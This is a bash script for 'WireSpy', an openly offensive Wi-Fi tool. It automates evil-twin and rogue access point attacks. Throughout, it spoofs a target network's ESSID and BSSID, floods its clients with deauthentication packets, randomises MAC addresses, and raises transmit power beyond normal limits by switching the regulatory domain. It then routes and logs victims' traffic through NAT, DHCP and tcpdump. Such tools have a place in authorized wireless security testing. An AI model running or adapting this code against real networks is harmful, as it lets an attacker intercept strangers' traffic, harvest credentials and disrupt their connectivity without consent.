#!/usr/bin/env bash
#
#    Copyright (C) 2015 - 2018 Alexandre Teyar
#
# Licensed under the Apache License, SCRIPT_VERSION 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

# TODO:
# * Implement nice coloring
# * Fix channel restrictions (WCHAN)

# enable stricter programming rules (turns some bugs into errors)
# set -Eeuo pipefail

declare -gr  PROGNAME=$(basename $0)
declare -gr  PROGBASENAME=${PROGNAME%%.*}
declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
declare -gr  PROGVERSION=0.6dev
declare -gr  BRANCH='master'
declare -gar REQUIRED_PACKAGES=( # comment this variable out if experiencing any issue with the dependencies checks
    'aircrack-ng'
    'coreutils'
    'git'
    'grep'
    'isc-dhcp-server'
    'macchanger'
    'procps'
    'rfkill'
    'iproute2'
    'iw'
    'tcpdump'
    'xterm'
)

declare -gr AIRBASE_ERROR='An error occurred with airbase-ng, no tap interface was created'
declare -gr AP_PREREQUISITE='To use this option, first configure a honeypot or an eviltwin'
declare -gr EVILTWIN_INFO="""
This attack consists of creating an evil copy of an access point and repeatedly sending deauth packets \
to its clients to force them to connect to our evil copy. Consequently, choose the same ESSID, BSSID and \
wireless channel as the targeted access point.
To properly perform this attack the attacker should first scan all the in-range access points to select a \
target. Next step is to copy the BSSID, ESSID and channel of the selected target access point, to create its twin. 
The final step is to deauthenticate all the clients from the target access point, so that the victims may connect \
to the evil twin.
"""

declare -gi isHoneypot=0
declare -gi isEviltwin=0

declare -gr REGEX_TINTF='at[[:digit:]]+' # according to airbase-ng documentation the tap interface is always like atX
declare -g  INTF=''
declare -g  MINTF=''
declare -g  TINTF=''
declare -g  WINTF=''

declare -gi PID_AIRBASE=0
declare -gi PID_AIREPLAY=0
declare -gi PID_TCPDUMP=0

declare -gr PROMPT=$(printf "%s »" "$PROGBASENAME")
declare -gr PROMPT_ET=$(printf "%s > %-8.8s »" "$PROGBASENAME" "eviltwin")
declare -gr PROMPT_HP=$(printf "%s > %-8.8s »" "$PROGBASENAME" "honeypot")
declare -gr PROMPT_PU=$(printf "%s > %-8.8s »" "$PROGBASENAME" "powerup")
declare -g  PS3="$(echo -e $PROMPT) "

print()         { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
print_error()   { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "error" "$1"; }
print_info()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "information" "$1"; }
print_intf()    { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "interface" "$1"; }
print_status()  { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "status" "$1"; }
print_warning() { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "warning" "$1"; }
print_hp()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "honeypot" "$1"; }
print_et()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "eviltwin" "$1"; }
print_pu()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "powerup" "$1"; }

trap quit INT

function quit() {
    clean_up
    exit 130
}

function banner() {
cat <<- BANNER
${PROGBASENAME^} v$PROGVERSION (type 'help' for a list of commands)
Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: github.com/AresS31

BANNER
}

function check_update() {
    print 'Checking for an update...'

    if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
    then
        if [[ $(git diff --name-only origin/$BRANCH -- ${0}) ]]
        then
            print 'A new version is available, consider updating using the command: git reset --hard && git pull origin $BRANCH --rebase'
        else
            print 'This is the latest stable version'
        fi
    else
        print_warning "It is recommended to fetch $0 on GitHub using the command: git clone https://github.com/AresS31/wirespy"
    fi
}

function check_compatibility() {
    local -i var=0
    
    print 'Bash version check...'
    if ((BASH_VERSINFO[0] < 4))
    then 
        var=1
        print_error "A minimum of bash version 4.0 is required. Upgrade your version with: sudo apt-get install --only-upgrade bash"
    else
        print 'The bash minimum version requirement is satisfied'
    fi

    print 'Dependencies check...'
    for package in ${REQUIRED_PACKAGES[@]}
    do
        if [[ $(dpkg -s $package 2> /dev/null) ]]
        then
            continue
        else
            var=1
            print_error "The $package package is missing. Install it with: sudo apt-get install $package -y"
        fi
    done

    if [[ $var = 1 ]]
    then
        exit 1
    fi

    print "All of the required packages are already installed"
    echo '' # add new line
}

function usage {

cat <<- USAGE

Attacks:
    eviltwin      > launch an evil-twin attack
    honeypot      > launch a rogue access point attack

Commands:
    clear         > clear the terminal
    help          > list available commands
    iw_scan       > show all wireless access points nearby
    quit|exit     > exit the program
    leases        > display DHCP leases
    powerup       > power wireless interface up (may cause issues)
    start capture > start packet capture (tcpdump)
    stop capture  > stop packet capture (tcpdump)
    status        > show modules status

USAGE
}

function menu() {
    clean_up &> /dev/null

    while :
    do
        read -p  "$(echo -e $PROMPT) "

        case $REPLY in
            'status')
                local honeypot_status='not running'
                local eviltwin_status='not running'
                local tcpdump_status='not running'

                if [[ $isEviltwin = 1 ]]
                then
                    eviltwin_status='running...'
                fi
                if [[ $isHoneypot = 1 ]]
                then
                    honeypot_status='running...'
                fi
                if (( $PID_TCPDUMP > 0 ))
                then
                    tcpdump_status='running...'
                fi

cat <<- STATUS

    eviltwin       > $eviltwin_status
    honeypot       > $honeypot_status
    packet capture > $tcpdump_status

STATUS
                ;;
            'clear')
                clear
                ;;
            'quit'|'exit')
                quit
                ;;
            'help')
                usage
                ;;
            'eviltwin')
                PS3="$(echo -e $PROMPT_ET) "
                isAttackRunning 'eviltwin'
                isEviltwin=1
                ;;
            'honeypot')
                PS3="$(echo -e $PROMPT_HP) "
                isAttackRunning 'honeypot'
                isHoneypot=1
                ;;
            'powerup')
                PS3="$(echo -e $PROMPT_PU) "
                isAttackRunning 'powerup'
                ;;
            'iw_scan')
                isAttackRunning 'iw_scan'
                ;;
            'lease'|'leases')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if [[ $(cat /var/run/dhcpd.pid) ]]
                    then
                        cat /var/lib/dhcp/dhcpd.leases
                    else
                        print_warning 'The DHCP server has not been started'
                    fi
                fi
                ;;
            'start capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if (( $PID_TCPDUMP == 0 ))
                    then
                        print_info "Packet capture started, the resulting file will be ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
                        # we want to keep the stderr in case of problem
                        PID_TCPDUMP=$(tcpdump -i $TINTF -w ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
                    else
                        print_warning 'The traffic is already being captured'
                    fi
                fi
                ;;
            'stop capture')
                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
                then
                    print_warning "$AP_PREREQUISITE"
                else
                    if (( $PID_TCPDUMP > 0 ))
                    then
                        print_info "Packet capture stopped"
                        kill -SIGTERM "$PID_TCPDUMP"
                        PID_TCPDUMP=0
                    else
                        print_warning 'No packet capture has been launched'
                    fi
                fi
                ;;
            *)
                print_warning "Invalid command: ${REPLY}. Type help for the list of available commands"
                ;;
        esac
    done
}

function eviltwin() {
    configure_intfs

    setManagedMode $MINTF 1> /dev/null && iw_scan $MINTF && setMonitorMode $MINTF 1> /dev/null
    
    echo "$EVILTWIN_INFO"

    print_et 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_ESSID

    print_et 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
    read -p "$(echo -e $PROMPT) " eviltwin_BSSID

    print_et 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -i WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
    PID_AIRBASE=$!
    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')
    
    if ! [[ $TINTF =~ $REGEX_TINTF ]]
    then
        print_error "$AIRBASE_ERROR"
        menu
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e eviltwin_ESSID $MINTF" &
    PID_AIREPLAY=$!
    sleep 4

    enable_internet
    
    print_info "The eviltwin $eviltwin_ESSID is now running..."
    sleep 4
}

function honeypot() {
    configure_intfs

    echo ''

    local -ar options=(
        "Blackhole: The access point type will respond to all probe requests (the access point may receive a lot \
of requests in areas with high levels of WiFi activity such as crowded public places)."
        'Bullzeye: The access point type will respond only to the probe requests specifying the access point ESSID.'
    )

    print_hp 'Select the type of honeypot you want to set up:'
    select option in "${options[@]}" 'quit'
    do
        case $REPLY in
            1) 
                local -ir attack_type=1
                break
                ;;
            2) 
                local -ir attack_type=2
                break
                ;;
            3)
                menu
                ;;
        esac
    done

    print_hp 'Enter the honeypot ESSID:'
    read -p "$(echo -e $PROMPT) " ESSID

    print_hp 'Enter the honeypot wireless channel (value must be between 1 and 12):'
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        case $REPLY in 
            [1-9]|1[0-2])
                local -ir WCHAN=$REPLY
                break
                ;;
            *) 
                print_warning "Invalid channel: $REPLY"
                ;;
        esac
    done

    print_hp 'Do you want to enable WEP authentication?'
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes')
                local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

                print_hp 'Enter a WEP password (the value must be 10 hexadecimal characters):'
                read -p "$(echo -e $PROMPT) " WEP 

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P -C 60 $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                esac
                break
                ;;
            'no') 
                local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")

                case $attack_type in
                    1)
                        xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;
                    2)
                        xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
                        PID_AIRBASE=$!
                        ;;  
                esac
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    sleep 4 # necessary to let TINTF come up before setting it up

    # extracting the tap interface
    TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')
    
    if ! [[ $TINTF =~ $REGEX_TINTF ]]
    then
        print_error "$AIRBASE_ERROR"
        menu
    fi

    enable_internet
    
    print_info "The honeypot $ESSID is now running..."
    sleep 4
}

function configure_intfs() {
    local -a INTERFACES

    print 'Select the Internet-facing interface:'
    get_intfs INTERFACES
    select option in "${INTERFACES[@]}" 'quit'
    do
        case $option in
          'quit')
                menu
                ;;
            *)
                if [[ $option ]]
                then
                    INTF=$(echo "$option" | awk -F': ' '{print $1}')
                    break
                fi
                ;;
        esac
    done

    print "Do you wish to randomise $INTF MAC address (this option can cause problems)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $INTF MAC address..."
                ip link set $INTF down && macchanger -A $INTF && ip link set $INTF up
                print_warning 'In case of problems, RESTART networking (/etc/init.d/network restart), or use wicd (wicd-client)'
                break
                ;;
            'no') 
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    local -a WINTERFACES

    print 'Select the wireless interface to use:'
    get_wintfs WINTERFACES
    select option in "${WINTERFACES[@]}" 'quit'
    do
        case $option in
            'quit')
                menu
                ;;
            *)
                if [[ $option ]]
                then
                    WINTF=$(echo "$option" | awk -F': ' '{print $1}')

                    if [[ $WINTF = $INTF ]]
                    then
                        print_warning "$WINTF is already in use, select another interface"
                    else
                        break
                    fi
                fi
                ;;
        esac
    done

    # prevent wlan adapter soft blocking
    rfkill unblock wifi

    setMonitorMode $WINTF
    MINTF=$WINTF
    
    print "Do you wish to randomise $MINTF MAC address (this option is recommended)?"
    select option in 'yes' 'no' 'quit'
    do
        case $option in
            'yes') 
                print_info "Randomising $MINTF MAC address..."
                ip link set $MINTF down && macchanger -A $MINTF && ip link set $MINTF up
                break
                ;;
            'no')
                break
                ;;
            'quit')
                menu
                ;;
        esac
    done

    print_info "Killing processes that may interfere with the honeypot|evil-twin..."
    airmon-ng check kill | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' # remove newlines

    sleep 4
}

function powerup() {
    local -a WINTERFACES
    local    WINTF=$1

    if ! [[ $WINTF ]]
    then
        print 'Select the wireless interface to boost-up:'
        get_wintfs WINTERFACES
        select option in "${WINTERFACES[@]}" 'quit'
        do
            case $option in
                'quit')
                    menu
                    ;;
                *)
                    if [[ $option ]]
                    then
                        WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                        break
                    fi
                    ;;
            esac
        done
    fi

    print_pu "Enter the power boost (the value must be up to to 4000) to apply to ${WINTF}:"
    while :
    do
        read -p  "$(echo -e $PROMPT) "
        
        if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
        then
            local -ir BOOST=$REPLY
            break
        else
            print_warning "Invalid value: $REPLY"
        fi
    done

    print_info "Powering ${WINTF} up..."
    # Bolivia allows high power levels
    ip link set $WINTF down && iw reg set BO && iw dev $WINTF set txpower fixed $BOOST && ip link set $WINTF up
    sleep 4

    echo ''
    iw dev $WINTF info
    echo ''
}

function iw_scan() {
    local -a WINTERFACES
    local    WINTF=$1

    if ! [[ $WINTF ]]
    then
        print 'Select the wireless interface to use:'
        get_wintfs WINTERFACES
        select option in "${WINTERFACES[@]}" 'quit'
        do
            case $option in
                'quit')
                    menu
                    ;;
                *)
                    if [[ $option ]]
                    then
                        WINTF=$(echo "$option" | awk -F': ' '{print $1}')
                        break
                    fi
                    ;;
            esac
        done
    fi

    if isMonitorMode $WINTF
    then
        print_warning "$WINTF is in monitor mode. Do you wish to switch it to managed mode (this will kill any running honeypot|eviltwin)?"
        select option in 'yes' 'no' 'quit'
        do
            case $option in
                'yes')
                    setManagedMode $WINTF
                    echo ''
                    iw $WINTF scan | sed -e 's#(on wlan# (on wlan#g' | awk -f "${PROGDIR}/config/iw_parsing.awk"
                    echo ''
                    menu
                    break
                    ;;
                'no') 
                    break
                    ;;
                'quit')
                    menu
                    ;;
            esac
        done
    else
        echo ''
        iw $WINTF scan | sed -e 's#(on wlan# (on wlan#g' | awk -f "${PROGDIR}/config/iw_parsing.awk"
        echo ''
    fi
}

function get_intfs() {
    local -r INTFS=$(ip -o link show | awk -F': ' '!/lo/{print $2}')
    local -n _INTERFACES=$1 # referenced copy of the array passed to the function

    if [[ $INTFS ]]
    then
        _INTERFACES=()

        for i in $INTFS
        do # get the network interfaces names
            IP=$(ip -o -f inet add show $i | awk '{print $4}')
            MAC=$(ip link show $i | awk '/ether/ {print $2}')
            _INTERFACES+=("${i}: $IP $MAC")
        done
    else
        print_error 'No networking interface detected'
        menu
    fi
}

function get_wintfs() {
    local -r WINTFS=$(ip -o link show | awk -F': ' '{print $2}' | egrep 'wlan[[:digit:]]+')
    local -n _WINTERFACES=$1 # referenced copy of the array passed to the function

    if [[ $WINTFS ]]
    then    
        _WINTERFACES=()

        for i in $WINTFS
        do # get the interfaces names
            IP=$(ip -o -f inet add show $i | awk '{print $4}')
            MAC=$(ip link show $i | awk '/ether/ {print $2}')
            _WINTERFACES+=("${i}: $IP $MAC")
        done
    else
        print_error 'No wireless interface detected'
        menu
    fi
}

function enable_internet() {
    # configuring the newly created tap intrface
    ip addr flush dev $TINTF
    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
    ip route flush dev $TINTF
    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF

    print_info 'Enabling IP forwarding...'
    echo 1 > /proc/sys/net/ipv4/ip_forward
    # setting up ip address and route

    print_info 'Configuring NAT iptables...'
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE

    # reset any pre-existing dhcp leases
    print_info 'Resetting pre-existing DHCP leases...'
    cat /dev/null > '/var/lib/dhcp/dhcpd.leases'
    cat /dev/null > '/tmp/dhcpd.conf'

    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations...'
    cp --backup "${PROGDIR}/config/dhcpd.conf" '/etc/dhcp/dhcpd.conf'
    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" '/etc/default/isc-dhcp-server'

    # starting the DHCP service
    print_info 'Starting DHCP server to provide the victims with internet access...'
    /etc/init.d/isc-dhcp-server start 
    sleep 4
}

function isAttackRunning() {
    delegate_function=$1

    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
    then
        print_warning "An attack (honeypot|evil-twin) is currently taking place. Do you wish to stop to start ${delegate_function}?"
        select option in 'yes' 'no'
        do
            case $option in
                'yes') 
                    print_info "Stopping the running attack..."
                    clean_up &> /dev/null
                    isHoneypot=0
                    isEviltwin=0
                    $delegate_function
                    break
                    ;;
                'no')
                    break
                    ;;
            esac
        done
    else
        $delegate_function
    fi
}

function isManagedMode() {
    local    WINTF=$1
    local -r isManagedMode=$(iw dev $WINTF info | grep 'managed')

    if [[ $isManagedMode ]]
    then
        return 0
    else
        return 1
    fi
}

function isMonitorMode() {
    local    WINTF=$1
    local -r isMonitorMode=$(iw dev $WINTF info | grep 'monitor')

    if [[ $isMonitorMode ]]
    then
        return 0
    else
        return 1
    fi
}

function setManagedMode() {
    local WINTF=$1

    if ! isManagedMode $WINTF
    then
        print_info "Starting managed mode on ${WINTF}..."
        ip link set $WINTF down && iw dev $WINTF set type managed && ip link set $WINTF up
        sleep 2

        if ! isManagedMode $WINTF
        then
            print_error "$WINTF could not enter managed mode, inspect this issue manually"
            menu
        fi
    fi
}

function setMonitorMode() {
    local WINTF=$1

    if ! isMonitorMode $WINTF
    then
        print_info "Starting monitor mode on ${WINTF}..."
        ip link set $WINTF down && iw dev $WINTF set type monitor && ip link set $WINTF up
        sleep 2

        if ! isMonitorMode $WINTF
        then
            print_error "$WINTF could not enter monitor mode, inspect this issue manually"
            menu
        fi
    fi
}

function clean_up() {
    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
    then
        print_info 'Terminating active processes...'
        if (( $PID_AIRBASE > 0 ))
        then
            kill -SIGTERM "$PID_AIRBASE"
            PID_AIRBASE=0
        fi
        if (( $PID_AIREPLAY > 0 ))
        then
            kill -SIGTERM "$PID_AIREPLAY"
            PID_AIREPLAY=0
        fi
        sleep 2
    
        print_info 'Removing temporary files...'
        rm -rf "${PROGDIR}/temp/*"

        print_info 'Disabling IP forwarding...'
        echo 0 > /proc/sys/net/ipv4/ip_forward

        print_info 'Flushing iptables...'
        iptables --flush
        iptables --table nat --flush
        iptables --delete-chain
        iptables --table nat --delete-chain

        print_info 'Restoring /etc/dhcp/dhcpd.conf and /etc/default/isc-dhcp-server original configurations...'
        mv '/etc/dhcp/dhcpd.conf~' '/etc/dhcp/dhcpd.conf'
        mv '/etc/default/isc-dhcp-server.bak' '/etc/default/isc-dhcp-server'

        print_info 'Stopping DHCP server...'
        /etc/init.d/isc-dhcp-server stop
    fi
    if [[ $MINTF ]]
    then
        setManagedMode $MINTF
        MINTF=''
    fi
    if (( $PID_TCPDUMP > 0 ))
    then
        print_info 'Terminating tcpdump...'
        kill -SIGTERM "$PID_TCPDUMP"
        PID_TCPDUMP=0
        sleep 2
    fi
}

# ensure that the script is running with root privileges
# this step is necessary since WireSpy needs to be perform network changes
if [[ $EUID -ne 0 ]]
then
    print_error "You must run this script as as root using the command: sudo bash $PROGNAME"
    exit 1
fi

banner
check_update
check_compatibility
menu
